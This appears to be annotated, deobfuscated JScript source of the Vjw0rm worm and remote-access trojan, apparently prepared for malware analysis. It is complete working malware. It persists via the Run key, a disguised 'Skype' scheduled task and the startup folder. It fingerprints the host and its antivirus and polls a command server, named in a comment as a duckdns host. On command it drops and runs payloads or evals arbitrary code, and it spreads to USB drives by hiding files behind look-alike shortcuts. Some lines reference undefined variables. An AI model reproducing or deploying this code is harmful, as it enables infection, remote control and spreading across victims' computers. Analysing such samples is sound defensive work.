var WindowsTools = ["WScript.Shell","Scripting.FileSystemObject","Shell.Application","Microsoft.XMLHTTP"];
var RegistryEntries = ["HKCU","HKLM","HKCU\\vjw0rm","\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\","HKLM\\SOFTWARE\\Classes\\","REG_SZ","\\defaulticon\\"];
var WindowsMgmt = ["winmgmts:","win32_logicaldisk","Win32_OperatingSystem",'AntiVirusProduct'];

var shell = ReturnWindowsTool(0);
var FileSystem = ReturnWindowsTool(1);
var SplitDelim = "|V|";
var BackSlash = "\\";
var HDDSerial = "windows" + "_" + GetInfo(6);
var ScriptName = WScript.ScriptName;
var ScriptFullName = WScript.ScriptFullName;
var isInTopDir;

try {
    // shell.RegRead('HKCU\\vjw0rm')
    // Reading registry key HKCU\\vjw0rm and storing it into isInTopDir. value is either TRUE or FALSE
    isInTopDir = shell.RegRead(RegistryEntries[2]);
} catch(err) {
    var sv = ScriptFullName.split("\\");
    if (":\\" + sv[1] + "== :\\" + ScriptName) { // If script is in top dir (c:\, e:\, etc)
	isInTopDir = "TRUE";
	// Writing REG_SZ key HKCU\\vjw0rm with TRUE
	shell.RegWrite(RegistryEntries[2],isInTopDir,RegistryEntries[5]);
    } else {
	isInTopDir = "FALSE";
	// Writing REG_SZ key HKCU\\vjw0rm with FALSE
	shell.RegWrite(RegistryEntries[2],isInTopDir,RegistryEntries[5]);
    }
}
// Try to persist on computer by various means
Persist();

do {
    try {
	var Response = PostFingerPrint('Vre','');
	Response = Response.split(SplitDelim);
	WScript.Echo(Response)
	// self termination
	if (Response[0] === "Cl") {
	    WScript.Quit(1);
	}

	// Drop file and run it
	if (Response[0] === "Sc") {
	    var pathToDrop = GetEnvironementVar("temp") + "\\" + Response[2];
	    var file = FileSystem.CreateTextFile(pathToDrop,true);
	    file.Write(Response[1]);
	    file.Close();
	    shell.run(pathToDrop);
	}

	// executes arbitrary JavaScript
	if (Response[0] === "Ex") {
	    eval(Response[1]);
	}

	// Modifies the HDDSerial Prefix
	// Maybe to invalidate the user agent ?
	if (Response[0] === "Rn") {
	    // Opens the script file for reading
	    var scriptr = FileSystem.OpenTextFile(ScriptFullName,1); // ri
	    var scriptContent = scriptr.ReadAll(); // fr
	    scriptr.Close();
	    HDDSerial = HDDSerial.split("_");
	    scriptContent = scriptContent.replace(HDDSerial[0],Response[1]);
	    // Opens the script for writing
	    var scriptw = FileSystem.OpenTextFile(ScriptFullName,2,false); // wi
	    scriptw.Write(scriptContent);
	    scriptw.Close();
	    shell.run("wscript.exe //B \"" + ScriptFullName + "\"");
	    WScript.Quit(1);
	}

	
	if (Response[0] === "Up") {
	    var pathTemp = GetEnvironementVar("temp") + "\\" + Response[2]; // s2
	    var file = FileSystem.CreateTextFile(pathTemp,true); // ctf
	    var gu = Response[1]; // gu
	    gu = gu.replace("|U|","|V|");
	    file.Write(gu);
	    file.Close();
	    shell.run("wscript.exe //B \"" + pathTemp + "\"",6);
	    WScript.Quit(1);
	}

	if (Response[0] === "Un") {
	    var s2 = Response[1];
	    var scriptPathTemp = GetEnvironementVar("Temp") + BackSlash + ScriptName;
	    var regi = "URCWXKQC01";
	    s2 = s2.replace("%f",ScriptFullName).replace("%n",ScriptName).replace("%sfdr",scriptPathTemp).replace("%RgNe%",regi);
	    eval(s2);
	    WScript.Quit(1);
	}

	if (Response[0] === "RF") {
	    var s2 = GetEnvironementVar("temp") + "\\" + Response[2];
	    var fi = FileSystem.CreateTextFile(s2,true);
	    fi.Write(Response[1]);
	    fi.Close();
	    shell.run(s2);
	}
   } catch(err) {
   }
    WScript.Sleep(7000);
    PropagateOnUsb();
} while (true) ;


function GetEnvironementVar(VariableName) {
    return shell.ExpandEnvironmentStrings("%" + VariableName + "%");
}
function PostFingerPrint(ressource,body) {
    // x = ReturnWindowsTool('XMLHTTP');
    // curl -A 'windows_0AEFADF6\DESKTOP-V3RVKO3\test\Microsoft Windows 10 Enterprise Evaluation\Windows Defender\\NO\TRUE\' --data ''  http://postventa-vodafone2006.duckdns.org:1993/Vre
    var X = ReturnWindowsTool(3);
    // url is supposed to be "http://postventa-vodafone2006.duckdns.org:1993/"
    X.open('POST','http://192.168.1.7:1993/Vre' + ressource, false);
    X.SetRequestHeader("User-Agent:",FingerPrint());
    X.send(body);
    return X.responsetext;
}

function FingerPrint() {
    var serial,NT,i;
    if (FileSystem.fileexists(GetEnvironementVar("Windir") + "\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe")) {
	NT ="YES";
    } else {
	NT = "NO";
    }
    // windows_0AEFADF6\DESKTOP-V3RVKO3\test\Microsoft Windows 10 Enterprise Evaluation\Windows Defender\\NO\TRUE\
    serial = HDDSerial + BackSlash + GetEnvironementVar("COMPUTERNAME") + BackSlash + GetEnvironementVar("USERNAME") + BackSlash + GetInfo(2) + BackSlash + GetInfo(4) + BackSlash + BackSlash + NT + BackSlash + isInTopDir + BackSlash;
    return serial;
}

function ReturnWindowsTool(ID) {
    return new ActiveXObject(WindowsTools[ID]);
}

function GetInfo(Action) {
    var s;
    // Get the os version
    if (Action == 2) {
	// GetObject('winmgmts:').InstancesOf('Win32_OperatingSystem');
	s = GetObject(WindowsMgmt[0]).InstancesOf(WindowsMgmt[2]);
	var en = new Enumerator(s);
	for (; !en.atEnd();en.moveNext()) {
	    var it = en.item();
	    return it.Caption;
	    break;
	}
    }
    // Enumerate Antivirus product and return the name of the AV
    if (Action == 4) {
	var wmg = "winmgmts:\\\\localhost\\root\\securitycenter";
	// GetObject(wmg).InstancesOf('AntiVirusProduct');
	s = GetObject(wmg).InstancesOf(WindowsMgmt[3]);
	var en = new Enumerator(s);
	for (; !en.atEnd();en.moveNext()) {
	    var it = en.item();
	    var str = it.DisplayName;
	}
	if (str !== '') {
	    // Look in winmgmts:\\\\localhost\\root\\securitycenter2
	    wmg = wmg + "2";
	    // GetObject(wmg).InstancesOf('AntiVirusProduct');
	    s = GetObject(wmg).InstancesOf(WindowsMgmt[3]);
	    en = new Enumerator(s);
	    for (; !en.atEnd();en.moveNext()) {
		it = en.item();
		return it.DisplayName;
	    }
	} else {
	    return it.DisplayName;
	}
    }
    // Get the serial number of the hdd
    if (Action==6) {
	// GetObject('winmgmts:').InstancesOf('win32_logicaldisk');
	s = GetObject(WindowsMgmt[0]).InstancesOf(WindowsMgmt[1]);
	var en = new Enumerator(s);
	for (; !en.atEnd();en.moveNext()) {
	    var it = en.item();
	    return it.volumeserialnumber;
	    break;
	}
    }
}

function Persist() {
	// Creates a path in tmp for the script
    var PathToScriptInTMP = GetEnvironementVar("TEMP") + BackSlash + ScriptName;
    try {
	// copy file in tmp
	FileSystem.CopyFile(ScriptFullName,PathToScriptInTMP,true);
    } catch(err) {
    }
    try {
	// Writes registry REG_SZ HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\URCWXKQC01 to start the newly created script in tmp
	shell.RegWrite(RegistryEntries[0] + RegistryEntries[3] + "URCWXKQC01","\"" + PathToScriptInTMP + "\"",RegistryEntries[5]);
    } catch(err) {
    }
    try {
	// Create a scheduled task named skype to run the script every 30 minutes 
	shell.run("Schtasks /create /sc minute /mo 30 /tn Skype /tr \"" + PathToScriptInTMP,false);
    } catch(err) {
    }
    
    try {
	// Shell.Application
	var app = ReturnWindowsTool(2);
	// Write the script in startup folder. app.NameSpace(7).Self.Path returns path to startup folder
	FileSystem.CopyFile(ScriptFullName, app.NameSpace(7).Self.Path + "\\" + ScriptName,true);
    } catch(err) {
    }
}


function PropagateOnUsb() {
    try {
	// var ld = GetObject("winmgmts:").InstancesOf('win32_logicaldisk');
	var LogicalDisk = GetObject(WindowsMgmt[0]).InstancesOf(WindowsMgmt[1]); 
	var edi = new Enumerator(LogicalDisk);
	// Enumerate drives
	for (;!edi.atEnd();edi.moveNext())  
	{       
	    var drive = edi.item();
	    // Get the unique identifier of the logicaldisk
	    var drive = FileSystem.GetDrive(drive.DeviceID); 
	    var DrivePath = drive.Path + "\\";
	    if (drive.IsReady) {
		// if drive is removable
		if (drive.DriveType === 1) {
		    // Copy the script to the removable media
		    FileSystem.CopyFile(ScriptFullName,DrivePath + ScriptName,true);
		    if (FileSystem.FileExists(DrivePath + ScriptName)) {
			// set the hidden and system flags on the file
			// https://msdn.microsoft.com/en-us/library/windows/desktop/gg258117(v=vs.85).aspx
			FileSystem.GetFile(DrivePath + ScriptName).attributes=2+4;
		    }
		    try {
			var enumFolders = new Enumerator(FileSystem.GetFolder(DrivePath).SubFolders); // ef
			// Enumerates folders on removable media and creates a shortcut that launches the script and open explorer,
			// named after each directory
			for (;!enumFolders.atEnd();enumFolders.moveNext()) {
			    var folder = enumFolders.item(); //gf
			    folder.attributes=2+4;
			    // Put scriptName in double quotes
			    ScriptName = ScriptName.replace(" ", "\"" + " " + "\"");
			    var folderName = folder.name; // n
			    // Put FolderName in double quotes
			    folderName = folderName.replace(" ", "\"" + " " + "\"");
			    // Creates a shortcut on removable media with folderName
			    var shortCut = shell.CreateShortCut(DrivePath + folder.name + ".lnk"); // sr
			    // 7 means windows is minimized and activates the next top level windows
			    shortCut.WindowStyle = 7;
			    // Makes the shortcut open cmd.exe, then explorer to make it look like nothing fishy happened
			    shortCut.TargetPath  = "cmd.exe";
			    shortCut.Arguments = "/c start " + ScriptName + "&start explorer " + folderName + "&exit";
			    var defaultFolderIconKey = "HKLM\\software\\classes\\folder\\defaulticon\\";
			    var defaultFolderIconPath = shell.RegRead(defaultFolderIconKey); //fic
			    // default WshShortcut.iconLocation is ",0" where 0 is an index
			    var iconLocation = shortCut.IconLocation; //ci
			    var sci = ",";
			    if (iconLocation.indexOf(sci) !== -1) {
				shortCut.IconLocation = defaultFolderIconPath;
			    } else {
				shortCut.IconLocation = folder.Path;
			    }
			    shortCut.Save();
			}

		    } catch(err) {}
		    try {
			var files = new Enumerator(FileSystem.GetFolder(DrivePath).Files);
			// Enumerates files on usb device
			for (;!files.atEnd();files.moveNext()) {
			    var file = files.item(); // gfi
			    var dot = ".";
			    var lnk = "lnk";
			    // If filename contains ".lnk"
			    if (file.name.indexOf(dot) !== -1) {
				if (file.name.indexOf(lnk) !== -1) {
				} else {
				    // verifies that current file is not the actual script
				    if (file.name !== ScriptName) {
					// sets hidden and system flags
					file.attributes=2+4;
					var fileName = file.name;
					fileName = fileName.replace(" ", "\"" + " " + "\"");
					ScriptName = ScriptName.replace(" ", "\"" + " " + "\"");
					// Creates a shortcut on the usb drive for each file present. Same technique as with the directory
					// Uses the same icon in order to hide from and confuse users.
					var shortCut = shell.CreateShortCut(DrivePath + file.name + ".lnk"); //shr
					shortCut.WindowStyle=7;
					shortCut.TargetPath = "cmd.exe";
					shortCut.Arguments = "/c start " + ScriptName + "&start " + fileName + "&exit";
					var fileNameSplit = currentFile.name.split("."); // sgf
					// reads the class default value which often contains ${extension}File
					var defaultName = shell.RegRead("HKLM\\software\\classes\\" + "." + fileNameSplit[fileNameSplit.length -1] /* extension */ + "\\"); // fvi
					// Get the defaulticon for the file type
					var icon = shell.RegRead("HKLM\\software\\classes\\" + defaultName + "\\defaulticon" + "\\"); //fvi2
					var iconLocation = shr.IconLocation; // ci
					var sci = ",";
					// default WshShortcut.iconLocation is ",0" where 0 is an index
					if (iconLocation.indexOf(sci) !== -1) {
					    shortCut.IconLocation = icon;
					} else {
					    shortCut.IconLocation = file.Path;
					}
					shortCut.Save();
				    }
				}
			    }
			}
		    } catch(err) {}
		}
	    }
	}

    } catch(err) {

    }
}
